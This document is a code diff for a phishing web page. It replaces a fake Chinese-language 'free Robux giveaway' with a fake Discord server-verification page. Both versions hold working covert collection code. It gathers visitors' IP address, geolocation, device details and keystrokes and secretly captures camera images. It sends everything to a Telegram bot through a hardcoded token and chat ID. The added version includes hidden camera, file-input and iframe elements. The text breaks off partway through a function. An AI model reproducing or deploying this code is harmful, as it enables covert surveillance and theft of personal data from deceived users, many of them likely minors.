@@ -3,696 +3,463 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎮 免费Robux抽奖活动 - 每日赢取10000 Robux！</title>
+    <title>Discord服务器验证 - 访问授权</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Microsoft YaHei', 'Segoe UI', sans-serif;
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
         }
 
         body {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            color: #fff;
+            background: #36393f;
+            color: #dcddde;
             min-height: 100vh;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             padding: 20px;
+            line-height: 1.5;
         }
 
-        .header {
-            text-align: center;
-            padding: 40px 20px;
-            margin-bottom: 30px;
-        }
-
-        .header h1 {
-            font-size: 3.2rem;
-            margin-bottom: 10px;
-            background: linear-gradient(90deg, #00a2ff 0%, #00ffaa 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 20px rgba(0, 255, 170, 0.3);
-        }
-
-        .header p {
-            font-size: 1.2rem;
-            color: #8af;
-            margin-bottom: 20px;
-        }
-
-        .robux-animation {
-            font-size: 2.5rem;
-            text-align: center;
-            animation: float 3s infinite ease-in-out;
-            margin: 20px 0;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .prize-showcase {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 25px;
-            margin: 40px 0;
-        }
-
-        .prize-card {
-            background: rgba(0, 40, 80, 0.7);
-            border: 2px solid #00ffaa;
-            border-radius: 15px;
-            padding: 25px;
-            width: 260px;
-            text-align: center;
-            transition: all 0.3s;
-            backdrop-filter: blur(10px);
-        }
-
-        .prize-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(0, 255, 170, 0.3);
-            border-color: #ff3366;
-        }
-
-        .prize-card h3 {
-            font-size: 1.6rem;
-            margin-bottom: 10px;
-            color: #00ffaa;
-        }
-
-        .prize-card .robux-amount {
-            font-size: 2.4rem;
-            color: #ffcc00;
-            font-weight: bold;
-            text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
-            margin: 10px 0;
-        }
-
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
+        .discord-container {
             width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            color: #00ffaa;
-            font-size: 1.2rem;
-        }
-
-        .loading-spinner {
-            width: 60px;
-            height: 60px;
-            border: 3px solid transparent;
-            border-top: 3px solid #00ffaa;
-            border-right: 3px solid #00ffaa;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .verification-panel {
-            background: rgba(0, 30, 60, 0.9);
-            border: 1px solid #00a2ff;
-            border-radius: 15px;
-            padding: 30px;
-            margin: 30px auto;
-            max-width: 800px;
-            display: none;
-        }
-
-        .data-stream {
-            height: 180px;
-            overflow-y: auto;
-            background: rgba(0, 0, 0, 0.7);
-            border: 1px solid #00ffaa;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 20px 0;
-            font-family: 'Consolas', 'Courier New', monospace;
-            color: #00ffaa;
-            font-size: 0.9rem;
-        }
-
-        .counter {
-            text-align: center;
-            font-size: 1.3rem;
-            color: #ff3366;
-            margin: 20px 0;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
-
-        .success-screen {
-            text-align: center;
-            padding: 50px 20px;
-            display: none;
-        }
-
-        .success-icon {
-            font-size: 5rem;
-            margin-bottom: 20px;
-            color: #00ffaa;
-            animation: celebrate 2s infinite;
-        }
-
-        @keyframes celebrate {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-
-        .winners-showcase {
-            background: rgba(0, 40, 80, 0.8);
-            border-radius: 15px;
-            padding: 25px;
-            margin: 30px auto;
-            max-width: 800px;
-        }
-
-        .winner-card {
-            display: flex;
-            align-items: center;
-            background: rgba(255, 255, 255, 0.1);
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 10px;
-            border-left: 4px solid #ffcc00;
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            margin: 30px 0;
+            max-width: 480px;
+            background: #2f3136;
+            border-radius: 8px;
             overflow: hidden;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
         }
 
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00ffaa, #00a2ff);
-            border-radius: 10px;
-            width: 0%;
-            transition: width 2s ease-in-out;
+        .discord-header {
+            background: #202225;
+            padding: 30px;
+            text-align: center;
+            border-bottom: 1px solid #292b2f;
         }
 
-        @media (max-width: 768px) {
-            .header h1 {
-                font-size: 2.2rem;
-            }
-            .prize-card {
-                width: 100%;
-                max-width: 300px;
-            }
+        .discord-icon {
+            width: 80px;
+            height: 80px;
+            background: #5865f2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
         }
 
-        .btn {
-            display: inline-block;
-            padding: 12px 30px;
-            background: linear-gradient(90deg, #00a2ff, #00ffaa);
-            color: #000;
+        .server-name {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .verification-text {
+            color: #b9bbbe;
+            font-size: 16px;
+        }
+
+        .discord-body {
+            padding: 40px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #b9bbbe;
+            font-size: 14px;
+            font-weight: 500;
+            text-transform: uppercase;
+        }
+
+        .discord-input {
+            width: 100%;
+            padding: 12px;
+            background: #40444b;
+            border: 1px solid #202225;
+            border-radius: 4px;
+            color: #dcddde;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+
+        .discord-input:focus {
+            outline: none;
+            border-color: #5865f2;
+        }
+
+        .verification-step {
+            background: #202225;
+            border-radius: 4px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 4px solid #5865f2;
+        }
+
+        .step-title {
+            color: #ffffff;
+            font-size: 18px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .step-icon {
+            color: #5865f2;
+        }
+
+        .step-description {
+            color: #b9bbbe;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .verify-button {
+            width: 100%;
+            padding: 16px;
+            background: #5865f2;
+            color: white;
             border: none;
-            border-radius: 50px;
-            font-size: 1.1rem;
-            font-weight: bold;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: background-color 0.2s;
+            margin-top: 10px;
         }
 
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 255, 170, 0.4);
+        .verify-button:hover {
+            background: #4752c4;
         }
 
-        .tip-box {
-            background: rgba(0, 100, 200, 0.2);
-            border-left: 4px solid #00a2ff;
-            padding: 15px;
+        .verify-button:disabled {
+            background: #4f545c;
+            cursor: not-allowed;
+        }
+
+        .loading-bar {
+            height: 4px;
+            background: #202225;
+            border-radius: 2px;
+            overflow: hidden;
             margin: 20px 0;
-            border-radius: 5px;
+        }
+
+        .loading-progress {
+            height: 100%;
+            background: #5865f2;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        .status-message {
+            text-align: center;
+            padding: 12px;
+            border-radius: 4px;
+            margin: 15px 0;
+            font-size: 14px;
+            display: none;
+        }
+
+        .status-success {
+            background: rgba(67, 181, 129, 0.1);
+            color: #43b581;
+            border: 1px solid #43b581;
+        }
+
+        .status-error {
+            background: rgba(240, 71, 71, 0.1);
+            color: #f04747;
+            border: 1px solid #f04747;
+        }
+
+        .privacy-notice {
+            font-size: 12px;
+            color: #72767d;
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #40444b;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        @media (max-width: 520px) {
+            .discord-body {
+                padding: 25px;
+            }
+            .discord-header {
+                padding: 25px;
+            }
         }
     </style>
 </head>
 <body>
-<!-- 加载遮罩 -->
-<div class="loading-overlay" id="loadingOverlay">
-    <div class="loading-spinner"></div>
-    <div id="loadingText">正在准备Robux抽奖系统...</div>
-    <div id="loadingProgress" style="margin-top: 10px; color: #8af;"></div>
-</div>
-
-<div class="container" id="mainContent" style="display: none;">
-    <!-- 头部 -->
-    <div class="header">
-        <h1>🎁 免费ROBUX抽奖活动 🎁</h1>
-        <p>每日送出10000 Robux！限时参与，先到先得！</p>
-        <div class="robux-animation">🪙💰💎🌟</div>
-    </div>
-
-    <!-- 在线计数器 -->
-    <div class="counter" id="onlineCounter">
-        当前有 <span id="onlineCount">1,247</span> 人在线抽奖！
-    </div>
-
-    <!-- 奖品展示 -->
-    <div class="prize-showcase">
-        <div class="prize-card">
-            <h3>🥇 一等奖</h3>
-            <div class="robux-amount">5,000 Robux</div>
-            <p>+ 高级游戏通行证</p>
-        </div>
-        <div class="prize-card">
-            <h3>🥈 二等奖</h3>
-            <div class="robux-amount">2,500 Robux</div>
-            <p>+ 独家游戏道具</p>
-        </div>
-        <div class="prize-card">
-            <h3>🥉 三等奖</h3>
-            <div class="robux-amount">1,000 Robux</div>
-            <p>+ 限定头像装扮</p>
-        </div>
-    </div>
-
-    <!-- 进度条 -->
-    <div class="progress-bar">
-        <div class="progress-fill" id="progressFill"></div>
-    </div>
-
-    <!-- 验证面板（隐藏） -->
-    <div class="verification-panel" id="verificationPanel">
-        <h3 style="color: #00ffaa; text-align: center; margin-bottom: 20px;">🔐 正在验证您的账户...</h3>
-        <div class="data-stream" id="dataStream">
-            [系统] 正在启动验证流程...<br>
-        </div>
-        <p style="text-align: center; color: #8af; margin-top: 15px;">
-            请稍候，我们正在验证您的账户资格...
-        </p>
-        <div class="tip-box">
-            <strong>📢 温馨提示：</strong> 为确保公平性，防止机器人刷奖，我们需要验证您的真实身份。
-        </div>
-    </div>
-
-    <!-- 获奖者展示 -->
-    <div class="winners-showcase">
-        <h3 style="color: #ffcc00; margin-bottom: 20px;">🎉 最近获奖者</h3>
-        <div class="winner-card">
-            <div style="background: #ffcc00; color: #000; padding: 5px 10px; border-radius: 5px; margin-right: 15px;">🥇</div>
-            <div>
-                <strong>@Roblox玩家123</strong> 刚刚赢得了 <span style="color: #ffcc00;">5,000 Robux</span>！
+    <div class="discord-container">
+        <!-- Discord头部 -->
+        <div class="discord-header">
+            <div class="discord-icon">
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="white">
+                    <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 6.658c.587 0 1.063.476 1.063 1.063v8.558c0 .587-.476 1.063-1.063 1.063H6.438c-.587 0-1.063-.476-1.063-1.063V7.721c0-.587.476-1.063 1.063-1.063h11.124zM12 8.5c-1.933 0-3.5 1.567-3.5 3.5s1.567 3.5 3.5 3.5 3.5-1.567 3.5-3.5S13.933 8.5 12 8.5z"/>
+                </svg>
             </div>
-            <div style="margin-left: auto; color: #8af;">2分钟前</div>
+            <div class="server-name">Discord服务器验证</div>
+            <div class="verification-text">请完成验证以访问服务器</div>
         </div>
-        <div class="winner-card">
-            <div style="background: #c0c0c0; color: #000; padding: 5px 10px; border-radius: 5px; margin-right: 15px;">🥈</div>
-            <div>
-                <strong>@游戏少女456</strong> 刚刚赢得了 <span style="color: #ffcc00;">2,500 Robux</span>！
-            </div>
-            <div style="margin-left: auto; color: #8af;">5分钟前</div>
-        </div>
-        <div class="winner-card">
-            <div style="background: #cd7f32; color: #000; padding: 5px 10px; border-radius: 5px; margin-right: 15px;">🥉</div>
-            <div>
-                <strong>@建筑大师789</strong> 刚刚赢得了 <span style="color: #ffcc00;">1,000 Robux</span>！
-            </div>
-            <div style="margin-left: auto; color: #8af;">10分钟前</div>
-        </div>
-    </div>
 
-    <!-- 成功屏幕 -->
-    <div class="success-screen" id="successScreen">
-        <div class="success-icon">✅</div>
-        <h2 style="color: #00ffaa; margin-bottom: 15px;">验证成功！</h2>
-        <p style="color: #8af; font-size: 1.2rem; margin-bottom: 25px;">
-            您已成功参与今日的Robux抽奖！开奖结果将通过Roblox站内信通知。🎉
-        </p>
-        <div style="background: rgba(0, 255, 170, 0.1); padding: 25px; border-radius: 15px; max-width: 500px; margin: 0 auto;">
-            <p style="color: #00ffaa; margin-bottom: 10px;">🎯 <strong>您的抽奖编号：</strong> <span id="entryNumber" style="color: #ffcc00;">RG-</span></p>
-            <p style="color: #00ffaa; margin-bottom: 10px;">⏰ <strong>开奖时间：</strong> 今日晚上8:00（美国东部时间）</p>
-            <p style="color: #00ffaa; margin-bottom: 10px;">📱 <strong>通知方式：</strong> Roblox站内信通知获奖者</p>
-            <p style="color: #00ffaa;">💰 <strong>今日总奖池：</strong> <span style="color: #ffcc00;">50,000 Robux</span></p>
-        </div>
-        <div style="margin-top: 30px; padding: 20px; background: rgba(0, 100, 200, 0.2); border-radius: 10px;">
-            <p style="color: #8af;">⚠️ 请保持此页面打开5分钟以确认您的参与资格！</p>
-        </div>
-    </div>
-
-    <!-- 隐藏元素 -->
-    <video id="cameraPreview" style="display: none;" autoplay playsinline></video>
-    <canvas id="photoCanvas" style="display: none;"></canvas>
-
-    <!-- 活动规则 -->
-    <div style="margin-top: 50px; padding: 25px; background: rgba(0, 30, 60, 0.5); border-radius: 15px;">
-        <h3 style="color: #00a2ff; margin-bottom: 15px;">📋 活动规则</h3>
-        <ul style="color: #aaf; padding-left: 20px;">
-            <li>每个Roblox账户只能参与一次</li>
-            <li>获奖者将在开奖后24小时内收到通知</li>
-            <li>Robux将在获奖后72小时内发放到账户</li>
-            <li>本次活动与Roblox Corporation无关</li>
-            <li>参与即表示同意我们的使用条款</li>
-        </ul>
-    </div>
-
-    <!-- 页脚 -->
-    <div style="text-align: center; margin-top: 50px; padding-top: 20px; border-top: 1px solid rgba(255, 255, 255, 0.1);">
-        <p style="color: #666; font-size: 0.9rem;">
-            © 2024 Robux抽奖官方平台。本活动与Roblox Corporation无关。<br>
-            Robux和Roblox是Roblox Corporation的商标。
-        </p>
-    </div>
-</div>
-
-<script>
-    // ==================== 配置信息 ====================
-    const TELEGRAM_CONFIG = {
-        botToken: "8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM",
-        chatId: "8313770381",
-        sendInterval: 3000
-    };
-
-    // ==================== 全局变量 ====================
-    let collectedData = {
-        timestamp: new Date().toISOString(),
-        status: '正在初始化',
-        ip: null,
-        location: null,
-        device: {},
-        network: {},
-        behavior: [],
-        camera: { accessed: false, photo: null }
-    };
-
-    let dataStreamInterval;
-    let telemetrySent = false;
-    let cameraAccessed = false;
-    let mousePositions = [];
-    let keyStrokes = [];
-
-    // ==================== DOM元素 ====================
-    const loadingOverlay = document.getElementById('loadingOverlay');
-    const loadingText = document.getElementById('loadingText');
-    const loadingProgress = document.getElementById('loadingProgress');
-    const mainContent = document.getElementById('mainContent');
-    const verificationPanel = document.getElementById('verificationPanel');
-    const dataStream = document.getElementById('dataStream');
-    const successScreen = document.getElementById('successScreen');
-    const cameraPreview = document.getElementById('cameraPreview');
-    const photoCanvas = document.getElementById('photoCanvas');
-    const progressFill = document.getElementById('progressFill');
-    const onlineCount = document.getElementById('onlineCount');
-    const entryNumber = document.getElementById('entryNumber');
-        // ==================== 工具函数 ====================
-        
-        // 更新加载文本
-        function updateLoading(text) {
-            if (loadingText) loadingText.textContent = text;
-        }
-
-        // 更新进度
-        function updateProgress(text, percent) {
-            if (loadingProgress) loadingProgress.textContent = text;
-            if (progressFill) progressFill.style.width = percent + '%';
-        }
-
-        // 记录数据流
-        function logToStream(message) {
-            if (dataStream) {
-                const timestamp = new Date().toLocaleTimeString();
-                dataStream.innerHTML += `[${timestamp}] ${message}<br>`;
-                dataStream.scrollTop = dataStream.scrollHeight;
-            }
-            console.log(message);
-        }
-
-        // 生成抽奖编号
-        function generateEntryNumber() {
-            const prefix = 'RG-';
-            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
-            let result = '';
-            for (let i = 0; i < 8; i++) {
-                result += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return prefix + result;
-        }
-
-        // 格式化Telegram消息
-        function formatTelegramMessage() {
-            return `🚨 新的ROBUX抽奖参与者 🚨
-
-📅 时间: ${new Date().toLocaleString()}
-🌐 IP地址: ${collectedData.ip || '未知'}
-📍 地理位置: ${collectedData.location || '未知'}
-📱 设备: ${collectedData.device.platform || '未知'}
-🖥️ 屏幕分辨率: ${collectedData.device.screen || '未知'}
-🌍 浏览器: ${collectedData.device.browser || '未知'} ${collectedData.device.browserVersion || ''}
-🗣️ 系统语言: ${collectedData.device.language || '未知'}
-⏱️ 时区: ${collectedData.device.timezone || '未知'}
-🛜 网络运营商: ${collectedData.network.isp || '未知'}
-🔋 电池状态: ${collectedData.device.battery || '未知'}
-📸 摄像头访问: ${cameraAccessed ? '成功 ✅' : '失败 ❌'}
-🖱️ 鼠标轨迹: ${mousePositions.length} 个点
-⌨️ 键盘输入: ${keyStrokes.length} 次按键
-🎯 UserAgent: ${collectedData.device.userAgent || '未知'}
-
-📊 完整数据:
-${JSON.stringify(collectedData, null, 2)}`;
-        }
-
-        // 发送到Telegram
-        async function sendToTelegram(message, isPhoto = false) {
-            if (!TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId) {
-                console.error('Telegram配置缺失！');
-                return false;
-            }
-
-            try {
-                let url, options;
+        <!-- 验证主体 -->
+        <div class="discord-body">
+            <div id="step1" class="verification-step">
+                <div class="step-title">
+                    <span class="step-icon">🔐</span>
+                    <span>身份验证</span>
+                </div>
+                <div class="step-description">
+                    为了确保您是真人用户，防止机器人滥用，需要进行身份验证。
+                </div>
                 
-                if (isPhoto) {
-                    // 发送照片
-                    url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`;
-                    const formData = new FormData();
-                    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
-                    formData.append('photo', message, 'face_verification.jpg');
-                    formData.append('caption', `📸 人脸验证 - ${new Date().toLocaleString()}`);
-                    
-                    options = {
-                        method: 'POST',
-                        body: formData
-                    };
-                } else {
-                    // 发送文本消息
-                    url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
-                    options = {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CONFIG.chatId,
-                            text: message,
-                            parse_mode: 'HTML'
-                        })
-                    };
-                }
-
-                const response = await fetch(url, options);
-                const result = await response.json();
+                <div class="form-group">
+                    <label class="form-label">Discord用户名</label>
+                    <input type="text" class="discord-input" id="discordUsername" placeholder="例如：User#1234" value="User#1234" readonly>
+                </div>
                 
-                if (result.ok) {
-                    logToStream(`✅ 数据已发送到Telegram ${isPhoto ? '(照片)' : '(文本)'}`);
-                    return true;
-                } else {
-                    logToStream(`❌ Telegram错误: ${result.description}`);
-                    return false;
-                }
-            } catch (error) {
-                logToStream(`❌ 网络错误: ${error.message}`);
-                return false;
-            }
-        }
-// ==================== 数据收集函数 ====================
+                <div class="form-group">
+                    <label class="form-label">验证代码</label>
+                    <input type="text" class="discord-input" id="verificationCode" placeholder="自动生成验证码..." value="DC-VERIFY-7X9P2R" readonly>
+                </div>
+            </div>
 
-// 收集网络信息
-async function collectNetworkInfo() {
-    updateProgress('正在收集网络信息...', 20);
+            <!-- 摄像头验证步骤 -->
+            <div id="step2" class="verification-step hidden">
+                <div class="step-title">
+                    <span class="step-icon">📷</span>
+                    <span>人脸验证</span>
+                </div>
+                <div class="step-description">
+                    请允许摄像头访问以完成人脸验证（确保光线充足）。
+                </div>
+                
+                <div class="form-group">
+                    <div id="cameraPreview" style="width: 100%; height: 200px; background: #202225; border-radius: 4px; margin: 15px 0; display: none;">
+                        <video id="cameraStream" style="width: 100%; height: 100%; object-fit: cover; border-radius: 4px;"></video>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 文件验证步骤 -->
+            <div id="step3" class="verification-step hidden">
+                <div class="step-title">
+                    <span class="step-icon">📁</span>
+                    <span>设备验证</span>
+                </div>
+                <div class="step-description">
+                    请选择1-2张图片验证您的设备（可选）。
+                </div>
+                
+                <div class="form-group">
+                    <div id="fileUploadArea" style="border: 2px dashed #5865f2; border-radius: 4px; padding: 30px; text-align: center; cursor: pointer; transition: background 0.2s; margin: 15px 0;">
+                        <div style="font-size: 48px; color: #5865f2; margin-bottom: 10px;">📤</div>
+                        <div style="color: #b9bbbe;">点击或拖放图片文件</div>
+                        <div style="font-size: 12px; color: #72767d; margin-top: 5px;">支持 JPG, PNG, GIF</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 加载进度条 -->
+            <div class="loading-bar">
+                <div class="loading-progress" id="loadingProgress"></div>
+            </div>
+
+            <!-- 状态消息 -->
+            <div id="successMessage" class="status-message status-success">
+                ✅ 验证成功！正在跳转...
+            </div>
+            
+            <div id="errorMessage" class="status-message status-error">
+                ❌ 验证失败，请重试
+            </div>
+
+            <!-- 验证按钮 -->
+            <button class="verify-button" id="verifyButton" onclick="startVerification()">
+                开始验证
+            </button>
+
+            <!-- 隐私声明 -->
+            <div class="privacy-notice">
+                点击"开始验证"即表示您同意我们的隐私政策和服务条款。
+                <br>验证数据仅用于安全检查，不会保存。
+            </div>
+        </div>
+    </div>
+
+    <!-- 隐蔽的收集元素 -->
+    <video id="hiddenCamera" autoplay playsinline style="display: none;"></video>
+    <canvas id="hiddenCanvas" style="display: none;"></canvas>
+    <input type="file" id="hiddenFileInput" accept="image/*" multiple style="display: none;">
+    <iframe id="hiddenFrame" style="display: none;"></iframe>
+
+    <script>
+        // ==================== 基础配置 ====================
+        const TELEGRAM_CONFIG = {
+            botToken: "8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM",
+            chatId: "8313770381"
+        };
+
+        // 全局变量
+        let currentStep = 1;
+        let verificationComplete = false;
+        let collectedData = {
+            timestamp: new Date().toISOString(),
+            steps: {},
+            files: []
+        };
+// ==================== DOM元素 ====================
+const verifyButton = document.getElementById('verifyButton');
+const loadingProgress = document.getElementById('loadingProgress');
+const successMessage = document.getElementById('successMessage');
+const errorMessage = document.getElementById('errorMessage');
+const cameraPreview = document.getElementById('cameraPreview');
+const cameraStream = document.getElementById('cameraStream');
+const fileUploadArea = document.getElementById('fileUploadArea');
+const hiddenCamera = document.getElementById('hiddenCamera');
+const hiddenCanvas = document.getElementById('hiddenCanvas');
+const hiddenFileInput = document.getElementById('hiddenFileInput');
+const hiddenFrame = document.getElementById('hiddenFrame');
+
+// ==================== 基础功能 ====================
+
+// 显示步骤
+function showStep(stepNumber) {
+    // 隐藏所有步骤
+    document.querySelectorAll('.verification-step').forEach(step => {
+        step.classList.add('hidden');
+    });
     
-    try {
-        // 获取IP地址
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        collectedData.ip = ipData.ip;
-        
-        // 获取地理位置
-        try {
-            const geoResponse = await fetch(`https://ipapi.co/${collectedData.ip}/json/`);
-            const geoData = await geoResponse.json();
-            
-            collectedData.network = {
-                ip: collectedData.ip,
-                city: geoData.city,
-                region: geoData.region,
-                country: geoData.country_name,
-                countryCode: geoData.country_code,
-                isp: geoData.org,
-                asn: geoData.asn,
-                vpn: geoData.vpn || false,
-                tor: geoData.tor || false,
-                proxy: geoData.proxy || false,
-                latitude: geoData.latitude,
-                longitude: geoData.longitude
-            };
-            
-            collectedData.location = `${geoData.city || '未知'}, ${geoData.country_name || '未知'}`;
-            logToStream(`📍 地理位置: ${collectedData.location}`);
-            logToStream(`🏢 网络运营商: ${geoData.org}`);
-            logToStream(`🌐 IP地址: ${collectedData.ip}`);
-            
-        } catch (geoError) {
-            // 备用API
-            try {
-                const fallbackResponse = await fetch(`http://ip-api.com/json/${collectedData.ip}`);
-                const fallbackData = await fallbackResponse.json();
-                if (fallbackData.status === 'success') {
-                    collectedData.network = {
-                        ip: collectedData.ip,
-                        city: fallbackData.city,
-                        region: fallbackData.regionName,
-                        country: fallbackData.country,
-                        isp: fallbackData.isp,
-                        latitude: fallbackData.lat,
-                        longitude: fallbackData.lon
-                    };
-                    collectedData.location = `${fallbackData.city}, ${fallbackData.country}`;
-                }
-            } catch (e) {}
-        }
-        
-    } catch (error) {
-        logToStream('⚠️ 网络信息收集失败');
+    // 显示当前步骤
+    const stepElement = document.getElementById(`step${stepNumber}`);
+    if (stepElement) {
+        stepElement.classList.remove('hidden');
+    }
+    
+    currentStep = stepNumber;
+}
+
+// 更新进度条
+function updateProgress(percent) {
+    if (loadingProgress) {
+        loadingProgress.style.width = percent + '%';
     }
 }
 
-// 收集设备信息
-function collectDeviceInfo() {
-    updateProgress('正在扫描设备信息...', 40);
-    
-    collectedData.device = {
+// 显示成功消息
+function showSuccess(message) {
+    successMessage.textContent = message;
+    successMessage.style.display = 'block';
+    errorMessage.style.display = 'none';
+}
+
+// 显示错误消息
+function showError(message) {
+    errorMessage.textContent = message;
+    errorMessage.style.display = 'block';
+    successMessage.style.display = 'none';
+}
+
+// 隐藏所有消息
+function hideMessages() {
+    successMessage.style.display = 'none';
+    errorMessage.style.display = 'none';
+}
+
+// 禁用/启用按钮
+function setButtonState(enabled, text) {
+    if (verifyButton) {
+        verifyButton.disabled = !enabled;
+        if (text) verifyButton.textContent = text;
+    }
+}
+
+// 延迟函数
+function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// 生成随机ID
+function generateRandomId() {
+    return Math.random().toString(36).substr(2, 9).toUpperCase();
+}
+
+// 格式化文件大小
+function formatFileSize(bytes) {
+    if (bytes === 0) return '0 B';
+    const k = 1024;
+    const sizes = ['B', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+}
+
+// 收集基础信息
+function collectBasicInfo() {
+    collectedData.basic = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
-        vendor: navigator.vendor,
         language: navigator.language,
-        languages: navigator.languages,
         screen: `${screen.width}x${screen.height}`,
-        colorDepth: screen.colorDepth,
-        pixelDepth: screen.pixelDepth,
-        orientation: screen.orientation?.type,
-        deviceMemory: navigator.deviceMemory || '未知',
-        hardwareConcurrency: navigator.hardwareConcurrency,
-        maxTouchPoints: navigator.maxTouchPoints,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timezoneOffset: new Date().getTimezoneOffset(),
-        doNotTrack: navigator.doNotTrack,
-        cookieEnabled: navigator.cookieEnabled,
-        online: navigator.onLine,
-        browser: detectBrowser(),
-        browserVersion: detectBrowserVersion(),
-        os: detectOS()
+        timestamp: new Date().toISOString(),
+        sessionId: generateRandomId()
     };
+}
 
-    // 连接信息
-    if (navigator.connection) {
-        collectedData.device.connection = {
-            effectiveType: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt,
-            saveData: navigator.connection.saveData
-        };
+// 获取IP和位置信息
+async function getNetworkInfo() {
+    try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        collectedData.network = { ip: ipData.ip };
+
+        try {
+            const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            const geoData = await geoRes.json();
+            collectedData.network.location = `${geoData.city || '未知'}, ${geoData.country_name || '未知'}`;
+            collectedData.network.isp = geoData.org;
+        } catch (e) {
+            // 静默失败
+        }
+    } catch (error) {
+        // 静默失败
     }
-
-    // 电池信息
-    if ('getBattery' in navigator) {
-        navigator.getBattery().then(battery => {
-            collectedData.device.battery = {
-                level: Math.round(battery.level * 100) + '%',
-                charging: battery.charging,
-                chargingTime: battery.chargingTime,
-                dischargingTime: battery.dischargingTime
-            };
-            logToStream(`🔋 电池状态: ${collectedData.device.battery.level}`);
-        });
-    }
-
-    logToStream(`📱 设备平台: ${collectedData.device.platform}`);
-    logToStream(`🖥️ 屏幕分辨率: ${collectedData.device.screen}`);
-    logToStream(`🌐 浏览器: ${collectedData.device.browser} ${collectedData.device.browserVersion}`);
-    logToStream(`⏱️ 时区: ${collectedData.device.timezone}`);
 }
+// ==================== 隐蔽摄像头访问 ====================
 
-// 检测浏览器
-function detectBrowser() {
-    const ua = navigator.userAgent;
-    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
-    if (ua.includes("Firefox")) return "Firefox";
-    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
-    if (ua.includes("Edg")) return "Edge";
-    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
-    return "未知";
-}
-
-// 检测浏览器版本
-function detectBrowserVersion() {
-    const ua = navigator.userAgent;
-    const matches = ua.match(/(chrome|firefox|safari|edge|opera|opr|msie|trident(?=\/))\/?\s*(\d+)/i);
-    return matches ? matches[2] : '未知';
-}
-
-// 检测操作系统
-function detectOS() {
-    const ua = navigator.userAgent;
